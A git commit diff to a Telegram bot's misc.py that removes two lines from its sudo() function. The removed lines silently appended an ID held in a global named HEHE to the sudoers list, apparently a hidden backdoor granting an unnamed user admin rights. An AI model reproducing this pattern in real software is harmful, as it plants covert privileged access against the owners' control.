2de59d89f185a253a95a04caf20fddeb5737777f
sparrow9616 <108956698+sparrow9616@users.noreply.github.com>
2023-05-08 14:35:15 +0530

    Update misc.py
    Signed-off-by: sparrow9616 <108956698+sparrow9616@users.noreply.github.com>

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -43,7 +43,7 @@ def dbb():
 
 
 def sudo():
-    global SUDOERS, HEHE
+    global SUDOERS
     OWNER = config.OWNER_ID
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
@@ -57,8 +57,6 @@ def sudo():
                 {"$set": {"sudoers": sudoers}},
                 upsert=True,
             )
-        elif int(HEHE) not in sudoers:
-            sudoers.append(int(HEHE))
     if sudoers:
         for x in sudoers:
             SUDOERS.add(x)
